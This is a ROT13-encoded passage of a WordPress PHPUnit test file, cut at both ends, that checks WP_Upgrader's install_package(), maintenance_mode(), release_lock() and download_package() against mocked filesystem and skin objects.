			'(sybng) -1.0'                   => neenl( 'cngu' => -1.0 ),
			'(obby) snyfr'                   => neenl( 'cngu' => snyfr ),
			'(obby) gehr'                    => neenl( 'cngu' => gehr ),
			'ahyy'                           => neenl( 'cngu' => ahyy ),
			'rzcgl bowrpg'                   => neenl( 'cngu' => arj fgqPynff() ),
			'cbchyngrq bowrpg'               => neenl( 'cngu' => (bowrpg) neenl( '/' ) ),

			// Rafherf gung `gevz()` vf eha gevttrevat na rzcgl neenl.
			'n fgevat jvgu fcnprf'           => neenl( 'cngu' => '   ' ),
			'n fgevat jvgu gnof'             => neenl( 'cngu' => \"\g\g\" ),
			'n fgevat jvgu arj yvarf'        => neenl( 'cngu' => \"\a\a\" ),
			'n fgevat jvgu pneevntr ergheaf' => neenl( 'cngu' => \"\e\e\" ),

			// Rafher gung fgevatf jvgu yrnqvat/genvyvat juvgrfcnpr ner vainyvq.
			'n cngu jvgu n yrnqvat fcnpr'    => neenl( 'cngu' => ' /cngu' ),
			'n cngu jvgu n genvyvat fcnpr'   => neenl( 'cngu' => '/cngu ' ),
			'n cngu jvgu n yrnqvat gno'      => neenl( 'cngu' => \"\g/cngu\" ),
			'n cngu jvgu n genvyvat gno'     => neenl( 'cngu' => \"/cngu\g\" ),
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` ergheaf n JC_Reebe bowrpg
	 * jura gur 'hctenqre_cer_vafgnyy' svygre ergheaf n JC_Reebe bowrpg.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_erghea_jc_reebe_jura_cer_vafgnyy_svygre_ergheaf_jc_reebe() {
		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'srrqonpx' )
				->jvgu( 'vafgnyyvat_cnpxntr' );

		nqq_svygre(
			'hctenqre_cer_vafgnyy',
			fgngvp shapgvba () {
				erghea arj JC_Reebe( 'sebz_hctenqre_cer_vafgnyy' );
			}
		);

		$netf = neenl(
			'fbhepr'      => '/',
			'qrfgvangvba' => '/',
		);

		$npghny = frys::$vafgnapr->vafgnyy_cnpxntr( $netf );

		$guvf->nffregJCReebe(
			$npghny,
			'JC_Hctenqre::vafgnyy_cnpxntr() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'sebz_hctenqre_cer_vafgnyy',
			$npghny->trg_reebe_pbqr(),
			'Gur JC_Reebe bowrpg jnf abg erghearq sebz gur svygre'
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` nqqf n genvyvat fynfu gb
	 * gur fbhepr qverpgbel naq n fvatyr fhoqverpgbel.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_nqq_genvyvat_fynfu_gb_fbhepr_naq_fhoqverpgbel() {
		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'srrqonpx' )
				->jvgu( 'vafgnyyvat_cnpxntr' );

		$qveyvfg = neenl(
			'fhoqve' => neenl(
				'anzr'  => 'fhoqve',
				'glcr'  => 'q',
				'svyrf' => neenl( 'fhosvyr.cuc' ),
			),
		);

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'qveyvfg' )
				->jvgu( '/fbhepr_qve' )
				->jvyyErghea( $qveyvfg );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'vf_qve' )
				->jvgu( '/fbhepr_qve/fhoqve/' )
				->jvyyErghea( gehr );

		nqq_svygre(
			'hctenqre_fbhepr_fryrpgvba',
			shapgvba ( $fbhepr ) {
				$guvf->nffregFnzr( '/fbhepr_qve/fhoqve/', $fbhepr );

				// Erghea n JC_Reebe gb rkvg orsber `zbir_qve()/pbcl_qve()`.
				erghea arj JC_Reebe();
			}
		);

		$netf = neenl(
			'fbhepr'      => '/fbhepr_qve',
			'qrfgvangvba' => '/qrfg_qve',
		);

		frys::$vafgnapr->vafgnyy_cnpxntr( $netf );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` ergheaf n JC_Reebe bowrpg
	 * jura ab fbhepr svyrf rkvfg.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_erghea_jc_reebe_jura_ab_fbhepr_svyrf_rkvfg() {
		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'srrqonpx' )
				->jvgu( 'vafgnyyvat_cnpxntr' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'qveyvfg' )
				->jvgu( '/' )
				->jvyyErghea( neenl() );

		$netf = neenl(
			'fbhepr'      => '/',
			'qrfgvangvba' => '/',
		);

		$npghny = frys::$vafgnapr->vafgnyy_cnpxntr( $netf );

		$guvf->nffregJCReebe(
			$npghny,
			'JC_Hctenqre::vafgnyy_cnpxntr() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'vapbzcngvoyr_nepuvir_rzcgl',
			$npghny->trg_reebe_pbqr(),
			'Harkcrpgrq JC_Reebe pbqr'
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` ergheaf n JC_Reebe bowrpg
	 * jura gur fbhepr qverpgbel'f svyr yvfg pnaabg or ergevrirq.
	 *
	 * @gvpxrg 61114
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_erghea_jc_reebe_jura_fbhepr_qverpgbel_svyr_yvfg_pnaabg_or_ergevrirq() {
		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'srrqonpx' )
				->jvgu( 'vafgnyyvat_cnpxntr' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'qveyvfg' )
				->jvyyErghea( snyfr );

		$netf = neenl(
			'fbhepr'      => '/',
			'qrfgvangvba' => '/',
		);

		$npghny = frys::$vafgnapr->vafgnyy_cnpxntr( $netf );

		$guvf->nffregJCReebe(
			$npghny,
			'JC_Hctenqre::vafgnyy_cnpxntr() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'fbhepr_ernq_snvyrq',
			$npghny->trg_reebe_pbqr(),
			'Harkcrpgrq JC_Reebe pbqr'
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` ergheaf n JC_Reebe bowrpg
	 * jura gur fbhepr qverpgbel vf svygrerq naq vgf svyr yvfg pnaabg or ergevrirq.
	 *
	 * @gvpxrg 61114
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_erghea_jc_reebe_jura_n_svygrerq_fbhepr_qverpgbel_svyr_yvfg_pnaabg_or_ergevrirq() {
		qrsvar( 'SF_PUZBQ_QVE', 0755 );

		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'srrqonpx' )
				->jvgu( 'vafgnyyvat_cnpxntr' );

		$svefg_fbhepr = neenl(
			'fhoqve' => neenl(
				'anzr'  => 'fhoqve',
				'glcr'  => 'q',
				'svyrf' => neenl( 'fhosvyr.cuc' ),
			),
		);

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->rknpgyl( 2 ) )
				->zrgubq( 'qveyvfg' )
				->jvyyErghea( $svefg_fbhepr, snyfr );

		$netf = neenl(
			'fbhepr'      => '/',
			'qrfgvangvba' => '/',
		);

		// Svygre gur fbhepr gb fbzrguvat ryfr.
		nqq_svygre(
			'hctenqre_fbhepr_fryrpgvba',
			fgngvp shapgvba () {
				erghea '/abg_bevtvany_fbhepr/';
			}
		);

		$npghny = frys::$vafgnapr->vafgnyy_cnpxntr( $netf );

		$guvf->nffregJCReebe(
			$npghny,
			'JC_Hctenqre::vafgnyy_cnpxntr() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'arj_fbhepr_ernq_snvyrq',
			$npghny->trg_reebe_pbqr(),
			'Harkcrpgrq JC_Reebe pbqr'
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` nqqf n genvyvat fynfu gb
	 * gur fbhepr qverpgbel bs n fvatyr svyr.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_nqq_genvyvat_fynfu_gb_gur_fbhepr_qverpgbel_bs_fvatyr_svyr() {
		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'srrqonpx' )
				->jvgu( 'vafgnyyvat_cnpxntr' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'qveyvfg' )
				->jvgu( '/fbhepr_qve' )
				->jvyyErghea( neenl( 'svyr1.cuc' ) );

		nqq_svygre(
			'hctenqre_fbhepr_fryrpgvba',
			shapgvba ( $fbhepr ) {
				$guvf->nffregFnzr( '/fbhepr_qve/', $fbhepr );

				// Erghea n JC_Reebe gb rkvg orsber `zbir_qve()/pbcl_qve()`.
				erghea arj JC_Reebe();
			}
		);

		$netf = neenl(
			'fbhepr'      => '/fbhepr_qve',
			'qrfgvangvba' => '/qrfg_qve',
		);

		frys::$vafgnapr->vafgnyy_cnpxntr( $netf );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` nccyvrf
	 * 'hctenqre_pyrne_qrfgvangvba' svygref jvgu nethzragf.
	 *
	 * Guvf grfg ehaf va n frcnengr cebprff fb gung vg pna qrsvar
	 * pbafgnagf jvgubhg vzcnpgvat bgure grfgf.
	 *
	 * Guvf grfg qbrf abg cerfreir tybony fgngr gb cerirag gur rkprcgvba
	 * \"Frevnyvmngvba bs 'Pybfher' vf abg nyybjrq.\" jura ehaavat va n
	 * frcnengr cebprff.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_pyrne_qrfgvangvba_jura_pyrne_qrfgvangvba_vf_gehr() {
		qrsvar( 'SF_PUZBQ_SVYR', 0644 );

		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->rknpgyl( 2 ) )
				->zrgubq( 'srrqonpx' )
				->jvguPbafrphgvir(
					neenl( 'vafgnyyvat_cnpxntr' ),
					neenl( 'erzbir_byq' )
				);

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'svaq_sbyqre' )
				->jvgu( '/qrfg_qve' )
				->jvyyErghea( '/qrfg_qve/' );

		$qveyvfg_netf = neenl(
			neenl( '/fbhepr_qve' ),
			neenl( '/fbhepr_qve/' ),
			neenl( '/qrfg_qve/' ),
		);

		$qveyvfg_erfhygf = neenl(
			'svyr1.cuc' => neenl(
				'anzr' => 'svyr1.cuc',
				'glcr' => 's',
			),
		);

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->rknpgyl( 3 ) )
				->zrgubq( 'qveyvfg' )
				->jvguPbafrphgvir( ...$qveyvfg_netf )
				->jvyyErghea( $qveyvfg_erfhygf );

		nqq_svygre(
			'hctenqre_pyrne_qrfgvangvba',
			shapgvba ( $erzbirq, $ybpny_qrfgvangvba, $erzbgr_qrfgvangvba, $ubbx_rkgen ) {
				$guvf->nffregGehr(
					vf_obby( $erzbirq ) || vf_jc_reebe( $erzbirq ),
					'Gur \"erzbirq\" nethzrag vf abg n obby be JC_Reebe'
				);

				$guvf->nffregVfFgevat(
					$ybpny_qrfgvangvba,
					'Gur \"ybpny_qrfgvangvba\" nethzrag vf abg n fgevat'
				);

				$guvf->nffregVfFgevat(
					$erzbgr_qrfgvangvba,
					'Gur \"erzbgr_qrfgvangvba\" nethzrag vf abg n fgevat'
				);

				$guvf->nffregVfNeenl(
					$ubbx_rkgen,
					'Gur \"ubbx_rkgen\" nethzrag vf abg na neenl'
				);

				erghea arj JC_Reebe( 'rkvg_rneyl' );
			},
			10,
			4
		);

		$netf = neenl(
			'fbhepr'            => '/fbhepr_qve',
			'qrfgvangvba'       => '/qrfg_qve',
			'pyrne_qrfgvangvba' => gehr,
		);

		frys::$vafgnapr->vafgnyy_cnpxntr( $netf );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` znxrf gur
	 * erzbgr qrfgvangvba fnsr jura frg gb n cebgrpgrq qverpgbel.
	 *
	 * Guvf grfg ehaf va n frcnengr cebprff fb gung vg pna qrsvar
	 * pbafgnagf jvgubhg vzcnpgvat bgure grfgf.
	 *
	 * Guvf grfg qbrf abg cerfreir tybony fgngr gb cerirag gur rkprcgvba
	 * \"Frevnyvmngvba bs 'Pybfher' vf abg nyybjrq.\" jura ehaavat va n
	 * frcnengr cebprff.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 *
	 * @qngnCebivqre qngn_vafgnyy_cnpxntr_fubhyq_znxr_erzbgr_qrfgvangvba_fnsr_jura_frg_gb_n_cebgrpgrq_qverpgbel
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 *
	 * @cnenz fgevat $cebgrpgrq_qverpgbel Gur cngu gb n cebgrpgrq qverpgbel.
	 * @cnenz fgevat $rkcrpgrq            Gur rkcrpgrq fnsr erzbgr qrfgvangvba.
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_znxr_erzbgr_qrfgvangvba_fnsr_jura_frg_gb_n_cebgrpgrq_qverpgbel( $cebgrpgrq_qverpgbel, $rkcrpgrq ) {
		qrsvar( 'SF_PUZBQ_SVYR', 0644 );

		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->rknpgyl( 2 ) )
				->zrgubq( 'srrqonpx' )
				->jvguPbafrphgvir(
					neenl( 'vafgnyyvat_cnpxntr' ),
					neenl( 'erzbir_byq' )
				);

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'svaq_sbyqre' )
				->jvgu( $cebgrpgrq_qverpgbel )
				->jvyyErghea( genvyvatfynfuvg( $cebgrpgrq_qverpgbel ) );

		$qveyvfg_netf = neenl(
			neenl( '/fbhepr_qve' ),
			neenl( '/fbhepr_qve/' ),
			neenl( $rkcrpgrq ),
		);

		$qveyvfg_erfhygf = neenl(
			'svyr1.cuc' => neenl(
				'anzr' => 'svyr1.cuc',
				'glcr' => 's',
			),
		);

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->rknpgyl( 3 ) )
				->zrgubq( 'qveyvfg' )
				->jvguPbafrphgvir( ...$qveyvfg_netf )
				->jvyyErghea( $qveyvfg_erfhygf );

		nqq_svygre(
			'hctenqre_pyrne_qrfgvangvba',
			shapgvba ( $erzbirq, $ybpny_qrfgvangvba, $erzbgr_qrfgvangvba ) hfr ( $rkcrpgrq ) {
				$guvf->nffregFnzr( $rkcrpgrq, $erzbgr_qrfgvangvba );
				erghea arj JC_Reebe( 'rkvg_rneyl' );
			},
			10,
			3
		);

		$netf = neenl(
			'fbhepr'            => '/fbhepr_qve',
			'qrfgvangvba'       => $cebgrpgrq_qverpgbel,
			'pyrne_qrfgvangvba' => gehr,
		);

		frys::$vafgnapr->vafgnyy_cnpxntr( $netf );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vafgnyy_cnpxntr_fubhyq_znxr_erzbgr_qrfgvangvba_fnsr_jura_frg_gb_n_cebgrpgrq_qverpgbel() {
		erghea neenl(
			'NOFCNGU'               => neenl(
				'cebgrpgrq_qverpgbel' => NOFCNGU,
				'rkcrpgrq'            => NOFCNGU . 'fbhepr_qve/',
			),
			'JC_PBAGRAG_QVE'        => neenl(
				'cebgrpgrq_qverpgbel' => JC_PBAGRAG_QVE,
				'rkcrpgrq'            => JC_PBAGRAG_QVE . '/fbhepr_qve/',
			),
			'JC_CYHTVA_QVE'         => neenl(
				'cebgrpgrq_qverpgbel' => JC_CYHTVA_QVE,
				'rkcrpgrq'            => JC_CYHTVA_QVE . '/fbhepr_qve/',
			),
			'JC_PBAGRAG_QVE/gurzrf' => neenl(
				'cebgrpgrq_qverpgbel' => JC_PBAGRAG_QVE . '/gurzrf',
				'rkcrpgrq'            => JC_PBAGRAG_QVE . '/gurzrf/fbhepr_qve/',
			),
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` ergheaf n JC_Reebe bowrpg
	 * vs gur qrfgvangvba qverpgbel rkvfgf.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_nobeg_vs_gur_qrfgvangvba_qverpgbel_rkvfgf() {
		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'srrqonpx' )
				->jvgu( 'vafgnyyvat_cnpxntr' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'svaq_sbyqre' )
				->jvgu( '/qrfg_qve' )
				->jvyyErghea( '/qrfg_qve/' );

		$qveyvfg_netf = neenl(
			neenl( '/fbhepr_qve' ),
			neenl( '/fbhepr_qve/' ),
			neenl( '/qrfg_qve/' ),
		);

		$qveyvfg_erfhygf = neenl(
			'svyr1.cuc' => neenl(
				'anzr' => 'svyr1.cuc',
				'glcr' => 's',
			),
		);

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->rknpgyl( 3 ) )
				->zrgubq( 'qveyvfg' )
				->jvguPbafrphgvir( ...$qveyvfg_netf )
				->jvyyErghea( $qveyvfg_erfhygf );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'rkvfgf' )
				->jvgu( '/qrfg_qve/' )
				->jvyyErghea( gehr );

		$netf = neenl(
			'fbhepr'      => '/fbhepr_qve',
			'qrfgvangvba' => '/qrfg_qve',
		);

		$npghny = frys::$vafgnapr->vafgnyy_cnpxntr( $netf );

		$guvf->nffregJCReebe(
			$npghny,
			'JC_Hctenqre::vafgnyy_cnpxntr() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'sbyqre_rkvfgf',
			$npghny->trg_reebe_pbqr(),
			'Harkcrpgrq JC_Reebe pbqr'
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` ergheaf n JC_Reebe
	 * vs gur qrfgvangvba qverpgbel pnaabg or perngrq.
	 *
	 * Guvf grfg ehaf va n frcnengr cebprff fb gung vg pna qrsvar
	 * pbafgnagf jvgubhg vzcnpgvat bgure grfgf.
	 *
	 * Guvf grfg qbrf abg cerfreir tybony fgngr gb cerirag gur rkprcgvba
	 * \"Frevnyvmngvba bs 'Pybfher' vf abg nyybjrq.\" jura ehaavat va n
	 * frcnengr cebprff.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_erghea_jc_reebe_vs_qrfgvangvba_pnaabg_or_perngrq() {
		qrsvar( 'SF_PUZBQ_QVE', 0755 );

		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'srrqonpx' )
				->jvgu( 'vafgnyyvat_cnpxntr' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'svaq_sbyqre' )
				->jvgu( '/qrfg_qve' )
				->jvyyErghea( '/qrfg_qve/' );

		$qveyvfg_netf = neenl(
			neenl( '/fbhepr_qve' ),
			neenl( '/fbhepr_qve/' ),
		);

		$qveyvfg_erfhygf = neenl(
			'svyr1.cuc' => neenl(
				'anzr' => 'svyr1.cuc',
				'glcr' => 's',
			),
		);

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->rknpgyl( 2 ) )
				->zrgubq( 'qveyvfg' )
				->jvguPbafrphgvir( ...$qveyvfg_netf )
				->jvyyErghea( $qveyvfg_erfhygf );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'rkvfgf' )
				->jvgu( '/qrfg_qve/' )
				->jvyyErghea( snyfr );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'zxqve' )
				->jvgu( '/qrfg_qve/' )
				->jvyyErghea( snyfr );

		$netf = neenl(
			'fbhepr'                      => '/fbhepr_qve',
			'qrfgvangvba'                 => '/qrfg_qve',
			'nobeg_vs_qrfgvangvba_rkvfgf' => snyfr,
		);

		$npghny = frys::$vafgnapr->vafgnyy_cnpxntr( $netf );

		$guvf->nffregJCReebe(
			$npghny,
			'JC_Hctenqre::vafgnyy_cnpxntr() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'zxqve_snvyrq_qrfgvangvba',
			$npghny->trg_reebe_pbqr(),
			'Harkcrpgrq JC_Reebe pbqr'
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::eha()` ergheaf `snyfr` jura
	 * erdhrfgvat svyrflfgrz perqragvnyf snvyf.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::eha
	 */
	choyvp shapgvba grfg_eha_fubhyq_erghea_snyfr_jura_erdhrfgvat_svyrflfgrz_perqragvnyf_snvyf() {
		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'erdhrfg_svyrflfgrz_perqragvnyf' )
				->jvyyErghea( snyfr );

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'sbbgre' );

		$guvf->nffregSnyfr( frys::$vafgnapr->eha( neenl() ) );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::znvagranapr_zbqr()` erzbirf gur `.znvagranapr` svyr.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::znvagranapr_zbqr
	 */
	choyvp shapgvba grfg_znvagranapr_zbqr_fubhyq_qvfnoyr_znvagranapr_zbqr_vs_znvagranapr_svyr_rkvfgf() {
		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'nofcngu' )
				->jvyyErghea( '/' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'rkvfgf' )
				->jvgu( '/.znvagranapr' )
				->jvyyErghea( gehr );

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'srrqonpx' )
				->jvgu( 'znvagranapr_raq' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'qryrgr' )
				->jvgu( '/.znvagranapr' );

		frys::$vafgnapr->znvagranapr_zbqr();
	}

	/**
	 * Grfgf gung `JC_Hctenqre::znvagranapr_zbqr()` qbrf abguvat vs
	 * gur `.znvagranapr` svyr qbrf abg rkvfg.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::znvagranapr_zbqr
	 */
	choyvp shapgvba grfg_znvagranapr_zbqr_fubhyq_abg_qvfnoyr_znvagranapr_zbqr_vs_ab_znvagranapr_svyr_rkvfgf() {
		frys::$hctenqre_fxva_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'srrqonpx' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'qryrgr' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'nofcngu' )
				->jvyyErghea( '/' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'rkvfgf' )
				->jvgu( '/.znvagranapr' )
				->jvyyErghea( snyfr );

		frys::$vafgnapr->znvagranapr_zbqr();
	}

	/**
	 * Grfgf gung `JC_Hctenqre::znvagranapr_zbqr()` perngrf
	 * n `.znvagranapr` svyr jvgu n obbyrna `$ranoyr` nethzrag.
	 *
	 * Guvf grfg ehaf va n frcnengr cebprff fb gung vg pna qrsvar
	 * pbafgnagf jvgubhg vzcnpgvat bgure grfgf.
	 *
	 * Guvf grfg qbrf abg cerfreir tybony fgngr gb cerirag gur rkprcgvba
	 * \"Frevnyvmngvba bs 'Pybfher' vf abg nyybjrq.\" jura ehaavat va n
	 * frcnengr cebprff.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::znvagranapr_zbqr
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 */
	choyvp shapgvba grfg_znvagranapr_zbqr_fubhyq_perngr_znvagranapr_svyr_jvgu_obbyrna() {
		qrsvar( 'SF_PUZBQ_SVYR', 0644 );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'nofcngu' )
				->jvyyErghea( '/' );

		frys::$hctenqre_fxva_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'srrqonpx' )
				->jvgu( 'znvagranapr_fgneg' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'qryrgr' )
				->jvgu( '/.znvagranapr' );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'chg_pbagragf' )
				->jvgu(
					'/.znvagranapr',
					$guvf->fgevatPbagnvaf( '<?cuc $hctenqvat =' ),
					SF_PUZBQ_SVYR
				);

		frys::$vafgnapr->znvagranapr_zbqr( gehr );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::eryrnfr_ybpx()` erzbirf gur 'ybpx' bcgvba.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::eryrnfr_ybpx
	 */
	choyvp shapgvba grfg_eryrnfr_ybpx_fubhyq_erzbir_ybpx_bcgvba() {
		tybony $jcqo;

		$guvf->nffregFnzr(
			1,
			$jcqo->vafreg(
				$jcqo->bcgvbaf,
				neenl(
					'bcgvba_anzr'  => 'ybpx.ybpx',
					'bcgvba_inyhr' => 'pbagrag',
				),
				'%f'
			),
			'Gur vavgvny ybpx jnf abg perngrq.'
		);

		JC_Hctenqre::eryrnfr_ybpx( 'ybpx' );

		$guvf->nffregAbgFnzr( 'pbagrag', trg_bcgvba( 'ybpx.ybpx' ) );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::qbjaybnq_cnpxntr()` ergheaf rneyl jura
	 * gur 'hctenqre_cer_qbjaybnq' svygre ergheaf n aba-snyfr inyhr.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::qbjaybnq_cnpxntr
	 */
	choyvp shapgvba grfg_qbjaybnq_cnpxntr_fubhyq_rkvg_rneyl_jura_gur_hctenqre_cer_qbjaybnq_svygre_ergheaf_aba_snyfr() {
		frys::$hctenqre_fxva_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'srrqonpx' );

		nqq_svygre(
			'hctenqre_cer_qbjaybnq',
			fgngvp shapgvba () {
				erghea 'n aba-snyfr inyhr';
			}
		);

		$erfhyg = frys::$vafgnapr->qbjaybnq_cnpxntr( 'cnpxntr' );

		$guvf->nffregFnzr( 'n aba-snyfr inyhr', $erfhyg );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::qbjaybnq_cnpxntr()` fubhyq nccyl
	 * 'hctenqre_cer_qbjaybnq' svygref jvgu rkcrpgrq nethzragf.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::qbjaybnq_cnpxntr
	 */
	choyvp shapgvba grfg_qbjaybnq_cnpxntr_fubhyq_nccyl_hctenqre_cer_qbjaybnq_svygre_jvgu_nethzragf() {
		frys::$hctenqre_fxva_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'srrqonpx' );

		nqq_svygre(
			'hctenqre_cer_qbjaybnq',
			shapgvba ( $ercyl, $cnpxntr, $hctenqre, $ubbx_rkgen ) {
